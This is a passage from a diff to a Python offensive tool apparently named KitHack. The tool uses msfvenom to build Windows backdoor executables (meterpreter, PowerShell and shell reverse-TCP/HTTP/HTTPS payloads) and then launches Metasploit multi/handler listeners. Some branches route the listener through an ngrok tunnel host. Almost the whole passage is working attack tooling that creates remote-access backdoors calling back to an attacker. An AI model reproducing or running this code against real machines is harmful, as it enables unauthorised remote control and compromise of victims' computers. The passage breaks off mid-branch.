+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			elif pay == 4:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p windows/x64/powershell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
-					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/powershell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			elif pay == 5:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p windows/x64/shell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p windows/x64/powershell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
-					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/powershell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/powershell_reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			elif pay == 6:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p windows/meterpreter_reverse_http LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p windows/x64/shell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
-					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/shell_reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			elif pay == 7:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p windows/meterpreter_reverse_https LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p windows/meterpreter_reverse_http LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
-					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter_reverse_http; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			elif pay == 8:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p windows/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p windows/meterpreter_reverse_https LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
-					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter_reverse_https; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			elif pay == 9:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p windows/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
-					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_tcp_dns; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter_reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			elif pay == 10:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p windows/metsvc_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
-					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/metsvc_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter/reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			elif pay == 11:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p windows/powershell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
-					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/powershell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter/reverse_tcp_dns; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter/reverse_tcp_dns; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			elif pay == 12:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p windows/shell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p windows/metsvc_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
-					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/metsvc_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/metsvc_reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
